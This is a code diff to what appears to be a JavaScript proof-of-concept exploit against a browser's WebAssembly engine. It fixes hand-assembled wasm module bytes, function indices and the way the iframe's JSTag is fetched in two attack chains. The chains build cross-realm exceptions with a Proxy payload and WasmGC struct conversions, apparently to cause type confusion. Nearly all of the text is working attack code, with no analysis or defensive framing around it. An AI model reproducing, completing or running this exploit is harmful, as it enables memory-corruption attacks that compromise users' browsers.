@@ -124,13 +124,13 @@ function makeLog(id) {
 const OBSERVER_BYTES = new Uint8Array([
   0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
   // types: () -> (), () -> (), (externref) -> (), (externref) -> ()
-  0x01,0x10,0x04,
+  0x01,0x0f,0x04,
     0x60,0x00,0x00,                   // type 0: ()        -> ()
     0x60,0x00,0x00,                   // type 1: ()        -> ()  (dup for fn)
     0x60,0x01,0x6f,0x00,              // type 2: externref -> ()  (for $t and $cb)
     0x60,0x01,0x6f,0x00,              // type 3: externref -> ()
   // imports: t=tag/type2, fn=func/type0, cb=func/type2
-  0x02,0x17,0x03,
+  0x02,0x16,0x03,
     0x01,0x6d,0x01,0x74,0x04,0x00,0x02,  // "m"."t"  : tag attr=0 type=2
     0x01,0x6d,0x02,0x66,0x6e,0x00,0x00,  // "m"."fn" : func type=0
     0x01,0x6d,0x02,0x63,0x62,0x00,0x02,  // "m"."cb" : func type=2
@@ -157,7 +157,9 @@ async function chainA() {
   if (typeof WebAssembly?.JSTag === 'undefined') {
     L.warn('WebAssembly.JSTag unavailable — needs Chrome 95+'); return;
   }
-  const T = frames[0].WebAssembly.JSTag;
+  const iframeWA = document.getElementById('f').contentWindow?.WebAssembly;
+  if (!iframeWA?.JSTag) { L.warn('iframe WebAssembly.JSTag unavailable'); return; }
+  const T = iframeWA.JSTag;
   if (T === WebAssembly.JSTag) { L.info('same JSTag — skip'); return; }
 
   // ── 1. Build cross-realm exception with Proxy payload ────────────
@@ -259,7 +261,9 @@ async function chainB() {
   if (typeof WebAssembly?.JSTag === 'undefined') {
     L.warn('WebAssembly.JSTag unavailable'); return;
   }
-  const T = frames[0].WebAssembly.JSTag;
+  const iframeWA = document.getElementById('f').contentWindow?.WebAssembly;
+  if (!iframeWA?.JSTag) { L.warn('iframe WebAssembly.JSTag unavailable'); return; }
+  const T = iframeWA.JSTag;
   if (T === WebAssembly.JSTag) { L.info('same JSTag — skip'); return; }
 
   // Check WasmGC support
@@ -330,7 +334,7 @@ async function chainB() {
   const MOD_A_BYTES = new Uint8Array([
     0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
     // types: struct{i32,i32}, (i32 i32)->externref
-    0x01,0x0c,0x02,
+    0x01,0x0d,0x02,
       0x5f,0x02,0x7f,0x00,0x7f,0x00,   // type 0: struct {i32,i32}
       0x60,0x02,0x7f,0x7f,0x01,0x6f,   // type 1: (i32,i32) -> externref
     0x03,0x02,0x01,0x01,
@@ -360,7 +364,7 @@ async function chainB() {
   //     end))
   const MOD_B_BYTES = new Uint8Array([
     0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
-    0x01,0x11,0x04,
+    0x01,0x10,0x04,
       0x5f,0x01,0x7e,0x00,              // type 0: struct {i64}  ($B)
       0x60,0x00,0x00,                   // type 1: () -> ()
       0x60,0x01,0x6f,0x00,              // type 2: externref -> ()
@@ -369,10 +373,10 @@ async function chainB() {
       0x01,0x6d,0x01,0x74,0x04,0x00,0x02,  // "m"."t" : tag type=2
       0x01,0x6d,0x02,0x66,0x6e,0x00,0x01,  // "m"."fn": func type=1
     0x03,0x02,0x01,0x03,
-    0x07,0x07,0x01,0x03,0x72,0x75,0x6e,0x00,0x02, // "run" = func 2
+    0x07,0x07,0x01,0x03,0x72,0x75,0x6e,0x00,0x01, // "run" = func 1 (fn=0, run=1)
     0x0a,0x16,0x01,0x14,0x00,
       0x06,0x7e,             // try (result i64)
-      0x10,0x01,             // call $fn (func 1, after tag import)
+      0x10,0x00,             // call $fn (func 0; tag import not in func space)
       0x42,0x00,             // i64.const 0
       0x07,0x00,             // catch $t
       0xfb,0x1b,             // any.convert_extern (externref -> anyref)
